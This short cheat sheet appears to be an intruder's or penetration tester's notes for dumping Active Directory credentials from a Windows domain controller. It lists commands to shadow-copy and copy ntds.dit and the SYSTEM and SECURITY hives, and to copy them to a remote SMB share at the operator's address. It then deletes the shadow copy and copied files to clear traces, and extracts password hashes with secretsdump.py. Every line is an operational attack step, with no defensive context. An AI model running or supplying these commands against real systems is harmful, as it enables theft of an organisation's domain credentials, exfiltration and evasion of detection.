*Finding ntds.dit location:
**dir ntds.dit /s

*Creating a copy of ntds.dit
*Manually
**vssadmin create shadow /for=C:
**vssadmin list shadows   [to see if the creation succeeded]
**copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\<location of your ntds.dit file> c:\temp\ntds.dit
*Copy sam/system from vss
**copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\SYSTEM C:\temp\SYSTEM
**copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\SECURITY c:\temp\SECURITY
*Copy sam/system from reg
**reg SAVE HKLM\SYSTEM C:\temp\SYSTEM
**reg SAVE HKLM\SECURITY C:\temp\SECURITY
*Check md5:
**Windows 2003: certutil -hashfile FILE md5
**Windows 7+: certutil -hash FILE md5
*Metasploit
**post/windows/gather/credentials/domain_hashdump [NOT RECOMMENDED]



*Copying
*SMB:
**copy C:\temp\ntds.dit \\your-ip\share\ntds.dit
**copy C:\temp\SECURITY \\your-ip\share\SECURITY
**copy C:\temp\SYSTEM \\your-ip\share\SYSTEM
*Metasploit


*Cleanup
**vssadmin delete shadows /shadow={<your shadow ID found with vssadmin list shadows>}
**del ntds.dit
**del SECURITY
**del SYSTEM


*Extracting secrets:
**secretsdump.py -security SECURITY -system SYSTEM -ntds ntds.dit LOCAL > hashes-raw.txt
